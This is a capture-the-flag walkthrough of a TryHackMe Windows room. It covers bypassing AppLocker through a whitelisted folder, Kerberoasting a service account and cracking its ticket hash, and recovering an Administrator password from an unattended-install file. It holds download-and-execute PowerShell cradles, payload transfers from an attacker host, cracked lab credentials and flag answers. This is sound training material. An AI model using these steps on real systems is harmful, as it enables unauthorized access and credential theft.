---
Bypass Windows Applocker and escalate your privileges. You will learn about kerberoasting, evading AV, bypassing applocker and escalating your privileges on a Windows system.
---

![](https://i.imgur.com/jcPrF8H.png)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/30e9d2f242351eb403a39da19b979be8.png)

### Deploy the Windows machine 

In this room you will learn the following:

    Windows Forensics
    Basics of kerberoasting
    AV Evading
    Applocker

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
Answer the questions below

Deploy the windows machine, you will be able to control this in your browser. However if you prefer to use your own RDP client, the credentials are below.

	Username: corp\dark
	Password: _QuejVudId6

```
┌──(kali㉿kali)-[~]
└─$ xfreerdp /u:dark /p:'_QuejVudId6' /v:10.10.62.161 /size:85% 
[14:39:54:545] [50855:50860] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[14:39:54:545] [50855:50860] [WARN][com.freerdp.crypto] - CN = omega.corp.local
[14:39:58:893] [50855:50860] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[14:39:58:893] [50855:50860] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[14:39:58:081] [50855:50860] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[14:39:58:081] [50855:50860] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
```

### Bypassing Applocker 

![](https://i.imgur.com/XtUZMLi.png)


AppLocker is an application whitelisting technology introduced with Windows 7. It allows restricting which programs users can execute based on the programs path, publisher and hash.

You will have noticed with the deployed machine, you are unable to execute your own binaries and certain functions on the system will be restricted.



There are many ways to bypass AppLocker.

	If AppLocker is configured with default AppLocker rules, we can bypass it by placing our executable in the following directory: C:\Windows\System32\spool\drivers\color - This is whitelisted by default. 

```
┌──(kali㉿kali)-[~]
└─$ mkdir corp
                                                                                                                                 
┌──(kali㉿kali)-[~]
└─$ cd corp     
                                                                                                                                 
┌──(kali㉿kali)-[~/corp]
└─$ ls
                                                                                                                                 
┌──(kali㉿kali)-[~/corp]
└─$ nano hello.c              
                                                                                                                                 
┌──(kali㉿kali)-[~/corp]
└─$ cat hello.c      
#include<stdio.h>

int main() {
        printf("Hello world!");
        return 0;
}


┌──(kali㉿kali)-[~/corp]
└─$ x86_64-w64-mingw32-gcc hello.c -o hello.exe                            
                                                                                                                 
┌──(kali㉿kali)-[~/corp]
└─$ ls
hello.c  hello.exe

┌──(kali㉿kali)-[~/corp]
└─$ python3 -m http.server   
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


go to c:\windows\system32 then execute cmd cz cannot search cmd

Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\System32>whoami
corp\dark

C:\Windows\System32>powershell -ex bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\System32> powershell -c "Invoke-WebRequest -Uri 'http://10.11.81.220:8000/hello.exe' -OutFile 'C:\Windows\System32\spool\drivers\color\hello.exe'"

Now, execute the program: 

C:\Windows\System32>cd c:\Windows\System32\spool\drivers\color

c:\Windows\System32\spool\drivers\color>.\hello.exe
Hello world!

It worked because the program was executed in a whitelisted location. Now, if we copy the executable to the user’s desktop, and try to execute it, it will be blocked. 

c:\Windows\System32\spool\drivers\color>copy hello.exe c:\users\dark\desktop
        1 file(s) copied.

c:\Windows\System32\spool\drivers\color>cd \users\dark\desktop

c:\Users\dark\Desktop>hello.exe
This program is blocked by group policy. For more information, contact your system administrator.


c:\Users\dark\Desktop>more \Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
ls
dir
Get-Content test
flag{a12a41b5f8111327690f836e9b302f0b}
iex(new-object net.webclient).DownloadString('http://127.0.0.1/test.ps1')
cls
exit
powershell -c "Invoke-WebRequest -Uri 'http://10.11.81.220:8000/hello.exe' -OutFile 'C:\Windows\System32\spool\drivers\color\hello.exe'"
cd c:\Windows\System32\spool\drivers\color
dir
hello.exe
\.hello.exe


```


Go ahead and use Powershell to download an executable of your choice locally, place it the whitelisted directory and execute it.



	Just like Linux bash, Windows powershell saves all previous commands into a file called ConsoleHost_history. This is located at %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

	Access the file and and obtain the flag.
	%userprofile% is c:\users\dark\ in this example.
*flag{a12a41b5f8111327690f836e9b302f0b}*

###  Kerberoasting 

![|222](https://i.imgur.com/9YDvbLg.png)

It is important you understand how Kerberous actually works in order to know how to exploit it. Watch the video below.

https://youtu.be/LmbP-XD1SC8

Kerberos is the authentication system for Windows and Active Directory networks. There are many attacks against Kerberos, in this room we will use a Powershell script to request a service ticket for an account and acquire a ticket hash. We can then crack this hash to get access to another user account!



Lets first enumerate Windows. If we run setspn -T medin -Q ​ */* we can extract all accounts in the SPN.

SPN is the Service Principal Name, and is the mapping between service and account.

Running that command, we find an existing SPN. What user is that for?

	C:\Windows\system32\cmd.exe - The location of CMD

```
c:\Users\dark\Desktop>setspn -T medin -Q */*
Ldap Error(0x51 -- Server Down): ldap_connect
Failed to retrieve DN for domain "medin" : 0x00000051
Warning: No valid targets specified, reverting to current domain.
CN=OMEGA,OU=Domain Controllers,DC=corp,DC=local
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local
        ldap/omega.corp.local/ForestDnsZones.corp.local
        ldap/omega.corp.local/DomainDnsZones.corp.local
        TERMSRV/OMEGA
        TERMSRV/omega.corp.local
        DNS/omega.corp.local
        GC/omega.corp.local/corp.local
        RestrictedKrbHost/omega.corp.local
        RestrictedKrbHost/OMEGA
        RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        HOST/OMEGA/CORP
        HOST/omega.corp.local/CORP
        HOST/OMEGA
        HOST/omega.corp.local
        HOST/omega.corp.local/corp.local
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/7c4e4bec-1a37-4379-955f-a0475cd78a5d/corp.local
        ldap/OMEGA/CORP
        ldap/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        ldap/omega.corp.local/CORP
        ldap/OMEGA
        ldap/omega.corp.local
        ldap/omega.corp.local/corp.local
CN=krbtgt,CN=Users,DC=corp,DC=local
        kadmin/changepw
CN=fela,CN=Users,DC=corp,DC=local
        HTTP/fela
        HOST/fela@corp.local
        HTTP/fela@corp.local

Existing SPN found!
```


*fela*

Now we have seen there is an SPN for a user, we can use Invoke-Kerberoast and get a ticket.

Lets first get the Powershell Invoke-Kerberoast script.

iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') 

Now lets load this into memory: Invoke-Kerberoast -OutputFormat hashcat ​ |fl

You should get a SPN ticket.

![](https://i.imgur.com/X2lGkzF.png)

Machines don't have internet access. You will need to download the Kerberoast.ps1 file manually, host a web server (sudo python -m SimpleHTTPServer 80) and use your local host to have the machine download it.



Lets use hashcat to bruteforce this password. The type of hash we're cracking is Kerberos 5 TGS-REP etype 23 and the hashcat code for this is 13100.

hashcat -m 13100 -​a 0 hash.txt wordlist --force

Crack the hash. What is the users password in plain text?
*rubenF124*

```
┌──(kali㉿kali)-[~/corp]
└─$ wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
--2022-09-28 16:59:25--  https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46848 (46K) [text/plain]
Saving to: ‘Invoke-Kerberoast.ps1’

Invoke-Kerberoast.ps1            100%[=======================================================>]  45.75K  --.-KB/s    in 0.01s   

2022-09-28 16:59:26 (3.11 MB/s) - ‘Invoke-Kerberoast.ps1’ saved [46848/46848]

                                                                                                                                 
┌──(kali㉿kali)-[~/corp]
└─$ ls
hello.c  hello.exe  Invoke-Kerberoast.ps1
                                                                                                                                 
┌──(kali㉿kali)-[~/corp]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

powershell

PS C:\Windows\System32\spool\drivers\color> Invoke-WebRequest -Uri 'http://10.11.81.220:8000/Invoke-Kerberoast.ps1' -OutFile 'Invoke-Kerberoast.ps1'

PS C:\Windows\System32\spool\drivers\color> . .\Invoke-Kerberoast.ps1

PS C:\Windows\System32\spool\drivers\color> Invoke-Kerberoast -OutputFormat hashcat |fl


TicketByteHexStream  :
Hash                 : $krb5tgs$23$*fela$corp.local$HTTP/fela*$30BA38D229EE3D103B1318563F83E9A1$CDD4CF4465CDAC959F32CFD
                       1AC71296A748D58CEF6EEEA0D4076FED0C2799055C5C0536F86C65D78C44A5538C0F9222A005A5A2E3ECC086010AABF5
                       C9E880418E0BAB2AD0AE8A6FD5E17B685878D115E814C9615940286AF8CF1EC40E1560D6325FF4A46522CEB7E377FF76
                       5ADF165E6B802B035B124279011E71220572B95A88457450848EAAB4171B6A55C3EBA9409E7A14372DB25358EDB74891
                       1663D6AE7DCB06D7748ED16CBB386E4A61459BD1286478E744F7F5E67298CCD70384572AE958B0507E888D53577FAD81
                       2B13D01510C79E5160AAE49901D1B465624836C0F2A53E29ABF93095ECC6A1AA445F4383E0012FBEEBE6A9501DD32879
                       9F0D70EB09D6210095275690C392025C38FE56DBF52775E41ADCDD32BCF5AD7E61DC8EAD114B7680F39C0DF84C194158
                       5B273E192343BB3DBE01C6D8226C985FC53AAD48443786E64B436FC8DE43E5546155B2170CA8F09245678879590EBFF2
                       258DEDD52EE0F850E17181D3FC9C4828E43C3BB4EE4C4E08A17A9331E34FF25430E57CE6AC27004CC91D72FF3936CD02
                       891E4E266C303F09C70EFC2D13074B9D43DB08FD992D592FABF618D64F583187241E7B0AB00558EBE267290DC8080AD2
                       16F67991DA138EFD92CB18B95A70969C9DE528503B897F4991F87F3AE0CCC28089F789CE990E712ACC5DCDDF37CC61A4
                       5CD95D7E532DA30CEBA454A5163EBF1CE267C5FF88150E3BEABC8CB92D76001E2FCA338648BD689884F9BAC6C536EAC2
                       A0119B0930C0EF638F486C3610929AEDAEB47C9D463BBDE25938FCDF6396D7B04858977575C307525F7EDD170C4F2A73
                       19EDEB11386344BECB56224A3A37ADC6BB1CF8E0B9088F36108D3FD31DCD80ECDE7DDA7B3F977731BFEA14F537C0F4B3
                       2E5A853164EE07ED279B8574CEB625AFB79A3C6F123FB2D57F85461EF2A034100387D5B081B164FF8B15DFD5AEDA0DE1
                       1A948D24CD4AEA0F48A83DFAD5E521D81C7494257584DC4270B746EBA09C500288BD0AADFC3545F08E783A7DBC7ED584
                       53DAB7748E9EE3F201F10A87C01553F712289537257F6479471DE6C9D36CF9BC7FA4C444313C10450BDA22B2F8BAE866
                       B705C34372D3AF01B32ACD4BF2D6162ADB6AFE876481B74C84C776D12CA1CBA8906F720F710A76CA0237B7E50F6C24E2
                       00343D1F08FC57D65A31CFC55723D535C384BA3D486BCACFDA5AFEAC8501DBF9982596F000D766CAAB6D9DAD73F5B27D
                       D5BDB52B8A3CCD3537ABFA02A84DFD0BA380DFDA0B52A4DE4C5F4E9C76053924B7464B7ACF0F6CAF93C3CFFB467D1EDF
                       F615F31EC9E109E7680F0AD9C421AF18521C18C9626AA6A44137B824911DFA92FA5759D88DFF49F43D23266EA8EC35F1
                       D3AF1DBDEB15E37CD9CA6E86F3C7BD8BE294226210B
SamAccountName       : fela
DistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local
ServicePrincipalName : HTTP/fela


┌──(kali㉿kali)-[~/corp]
└─$ nano hash.txt
                                                                                                                                 
┌──(kali㉿kali)-[~/corp]
└─$ cat hash.txt 
$krb5tgs$23$*fela$corp.local$HTTP/fela*$30BA38D229EE3D103B1318563F83E9A1$CDD4CF4465CDAC959F32CFD1AC71296A748D58CEF6EEEA0D4076FED0C2799055C5C0536F86C65D78C44A5538C0F9222A005A5A2E3ECC086010AABF5C9E880418E0BAB2AD0AE8A6FD5E17B685878D115E814C9615940286AF8CF1EC40E1560D6325FF4A46522CEB7E377FF765ADF165E6B802B035B124279011E71220572B95A88457450848EAAB4171B6A55C3EBA9409E7A14372DB25358EDB748911663D6AE7DCB06D7748ED16CBB386E4A61459BD1286478E744F7F5E67298CCD70384572AE958B0507E888D53577FAD812B13D01510C79E5160AAE49901D1B465624836C0F2A53E29ABF93095ECC6A1AA445F4383E0012FBEEBE6A9501DD328799F0D70EB09D6210095275690C392025C38FE56DBF52775E41ADCDD32BCF5AD7E61DC8EAD114B7680F39C0DF84C1941585B273E192343BB3DBE01C6D8226C985FC53AAD48443786E64B436FC8DE43E5546155B2170CA8F09245678879590EBFF2258DEDD52EE0F850E17181D3FC9C4828E43C3BB4EE4C4E08A17A9331E34FF25430E57CE6AC27004CC91D72FF3936CD02891E4E266C303F09C70EFC2D13074B9D43DB08FD992D592FABF618D64F583187241E7B0AB00558EBE267290DC8080AD216F67991DA138EFD92CB18B95A70969C9DE528503B897F4991F87F3AE0CCC28089F789CE990E712ACC5DCDDF37CC61A45CD95D7E532DA30CEBA454A5163EBF1CE267C5FF88150E3BEABC8CB92D76001E2FCA338648BD689884F9BAC6C536EAC2A0119B0930C0EF638F486C3610929AEDAEB47C9D463BBDE25938FCDF6396D7B04858977575C307525F7EDD170C4F2A7319EDEB11386344BECB56224A3A37ADC6BB1CF8E0B9088F36108D3FD31DCD80ECDE7DDA7B3F977731BFEA14F537C0F4B32E5A853164EE07ED279B8574CEB625AFB79A3C6F123FB2D57F85461EF2A034100387D5B081B164FF8B15DFD5AEDA0DE11A948D24CD4AEA0F48A83DFAD5E521D81C7494257584DC4270B746EBA09C500288BD0AADFC3545F08E783A7DBC7ED58453DAB7748E9EE3F201F10A87C01553F712289537257F6479471DE6C9D36CF9BC7FA4C444313C10450BDA22B2F8BAE866B705C34372D3AF01B32ACD4BF2D6162ADB6AFE876481B74C84C776D12CA1CBA8906F720F710A76CA0237B7E50F6C24E200343D1F08FC57D65A31CFC55723D535C384BA3D486BCACFDA5AFEAC8501DBF9982596F000D766CAAB6D9DAD73F5B27DD5BDB52B8A3CCD3537ABFA02A84DFD0BA380DFDA0B52A4DE4C5F4E9C76053924B7464B7ACF0F6CAF93C3CFFB467D1EDFF615F31EC9E109E7680F0AD9C421AF18521C18C9626AA6A44137B824911DFA92FA5759D88DFF49F43D23266EA8EC35F1D3AF1DBDEB15E37CD9CA6E86F3C7BD8BE294226210B


┌──(kali㉿kali)-[~/corp]
└─$ hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1243/2551 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5tgs$23$*fela$corp.local$HTTP/fela*$30ba38d229ee3d103b1318563f83e9a1$cdd4cf4465cdac959f32cfd1ac71296a748d58cef6eeea0d4076fed0c2799055c5c0536f86c65d78c44a5538c0f9222a005a5a2e3ecc086010aabf5c9e880418e0bab2ad0ae8a6fd5e17b685878d115e814c9615940286af8cf1ec40e1560d6325ff4a46522ceb7e377ff765adf165e6b802b035b124279011e71220572b95a88457450848eaab4171b6a55c3eba9409e7a14372db25358edb748911663d6ae7dcb06d7748ed16cbb386e4a61459bd1286478e744f7f5e67298ccd70384572ae958b0507e888d53577fad812b13d01510c79e5160aae49901d1b465624836c0f2a53e29abf93095ecc6a1aa445f4383e0012fbeebe6a9501dd328799f0d70eb09d6210095275690c392025c38fe56dbf52775e41adcdd32bcf5ad7e61dc8ead114b7680f39c0df84c1941585b273e192343bb3dbe01c6d8226c985fc53aad48443786e64b436fc8de43e5546155b2170ca8f09245678879590ebff2258dedd52ee0f850e17181d3fc9c4828e43c3bb4ee4c4e08a17a9331e34ff25430e57ce6ac27004cc91d72ff3936cd02891e4e266c303f09c70efc2d13074b9d43db08fd992d592fabf618d64f583187241e7b0ab00558ebe267290dc8080ad216f67991da138efd92cb18b95a70969c9de528503b897f4991f87f3ae0ccc28089f789ce990e712acc5dcddf37cc61a45cd95d7e532da30ceba454a5163ebf1ce267c5ff88150e3beabc8cb92d76001e2fca338648bd689884f9bac6c536eac2a0119b0930c0ef638f486c3610929aedaeb47c9d463bbde25938fcdf6396d7b04858977575c307525f7edd170c4f2a7319edeb11386344becb56224a3a37adc6bb1cf8e0b9088f36108d3fd31dcd80ecde7dda7b3f977731bfea14f537c0f4b32e5a853164ee07ed279b8574ceb625afb79a3c6f123fb2d57f85461ef2a034100387d5b081b164ff8b15dfd5aeda0de11a948d24cd4aea0f48a83dfad5e521d81c7494257584dc4270b746eba09c500288bd0aadfc3545f08e783a7dbc7ed58453dab7748e9ee3f201f10a87c01553f712289537257f6479471de6c9d36cf9bc7fa4c444313c10450bda22b2f8bae866b705c34372d3af01b32acd4bf2d6162adb6afe876481b74c84c776d12ca1cba8906f720f710a76ca0237b7e50f6c24e200343d1f08fc57d65a31cfc55723d535c384ba3d486bcacfda5afeac8501dbf9982596f000d766caab6d9dad73f5b27dd5bdb52b8a3ccd3537abfa02a84dfd0ba380dfda0b52a4de4c5f4e9c76053924b7464b7acf0f6caf93c3cffb467d1edff615f31ec9e109e7680f0ad9c421af18521c18c9626aa6a44137b824911dfa92fa5759d88dff49f43d23266ea8ec35f1d3af1dbdeb15e37cd9ca6e86f3c7bd8be294226210b:rubenF124
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*fela$corp.local$HTTP/fela*$30ba38d229e...26210b
Time.Started.....: Wed Sep 28 17:05:50 2022 (13 secs)
Time.Estimated...: Wed Sep 28 17:06:03 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   407.3 kH/s (0.75ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4132864/14344385 (28.81%)
Rejected.........: 0/4132864 (0.00%)
Restore.Point....: 4131840/14344385 (28.80%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: rubichato -> ruben53
Hardware.Mon.#1..: Util: 46%

Started: Wed Sep 28 17:05:43 2022
Stopped: Wed Sep 28 17:06:05 2022

or

┌──(kali㉿kali)-[~/corp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rubenF124        (?)     
1g 0:00:00:03 DONE (2022-09-28 17:07) 0.3267g/s 1350Kp/s 1350Kc/s 1350KC/s rubibrian7..ruben4484
Use the "--show" option to display all of the cracked passwords reliably
Session completed.


```


```

┌──(kali㉿kali)-[~]
└─$ xfreerdp /u:'fela' /p:'rubenF124' /v:10.10.62.161 /size:85%

flag{bde1642535aa396d2439d86fe54a36e4}

```


Login as this user. What is his flag?
Look on their desktop.
*flag{bde1642535aa396d2439d86fe54a36e4}*

### Privilege Escalation 

We will use a PowerShell enumeration script to examine the Windows machine. We can then determine the best way to get Administrator access.



We will run PowerUp.ps1 for the enumeration.

Lets load PowerUp1.ps1 into memory.

iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1') 

The script has identified several ways to get Administrator access. The first being to bypassUAC and the second is UnattendedPath. We will be exploiting the UnattendPath way.

"Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode." Read more about it here.

	It is also where users passwords are stored in base64. Navigate to C:\Windows\Panther\Unattend\Unattended.xml.

![](https://i.imgur.com/IMU9bcO.png)


```
┌──(kali㉿kali)-[~/corp]
└─$ wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1                          
--2022-09-28 17:10:30--  https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 494860 (483K) [text/plain]
Saving to: ‘PowerUp.ps1’

PowerUp.ps1                      100%[=======================================================>] 483.26K  --.-KB/s    in 0.05s   

2022-09-28 17:10:31 (9.51 MB/s) - ‘PowerUp.ps1’ saved [494860/494860]

                                                                                                                                 
┌──(kali㉿kali)-[~/corp]
└─$ ls
hash.txt  hello.c  hello.exe  Invoke-Kerberoast.ps1  PowerUp.ps1


again go to c:\windows\system32\cmd

┌──(kali㉿kali)-[~/corp]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.62.161 - - [28/Sep/2022 17:12:20] "GET /PowerUp.ps1 HTTP/1.1" 200 -


PS C:\Windows\System32> cd C:\Users\fela.CORP
PS C:\Users\fela.CORP> Invoke-WebRequest -Uri 'http://10.11.81.220:8000/PowerUp.ps1' -OutFile 'PowerUp.ps1'
PS C:\Users\fela.CORP> . .\PowerUp.ps1

PS C:\Users\fela.CORP> Invoke-AllChecks

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...
[+] User is in a local group that grants administrative privileges!
[+] Run a BypassUAC attack to elevate privileges to admin.


[*] Checking for unquoted service paths...


[*] Checking service executable and argument permissions...


[*] Checking service permissions...


[*] Checking %PATH% for potentially hijackable .dll locations...


HijackablePath : C:\Users\fela.CORP\AppData\Local\Microsoft\WindowsApps\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\fela.CORP\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll'
                 -Command '...'





[*] Checking for AlwaysInstallElevated registry key...


[*] Checking for Autologon credentials in registry...


[*] Checking for vulnerable registry autoruns and configs...


[*] Checking for vulnerable schtask files/configs...


[*] Checking for unattended install files...


UnattendPath : C:\Windows\Panther\Unattend\Unattended.xml





[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...


PS C:\Users\fela.CORP> more C:\Windows\Panther\Unattend\Unattended.xml
<AutoLogon>
    <Password>
        <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
        <PlainText>false</PlainText>
    </Password>
    <Enabled>true</Enabled>
    <Username>Administrator</Username>
</AutoLogon>


dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=

base64

tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T

When you will connect as administrator, you will be prompted to change the password. Make sure you set up a strong password, else you’ll have to type the password again :). 


```


![[Pasted image 20220928162056.png]]

What is the decoded password?
**


Now we have the Administrator's password, login as them and obtain the last flag.
*THM{g00d_j0b_SYS4DM1n_M4s73R}*



[[Retro]]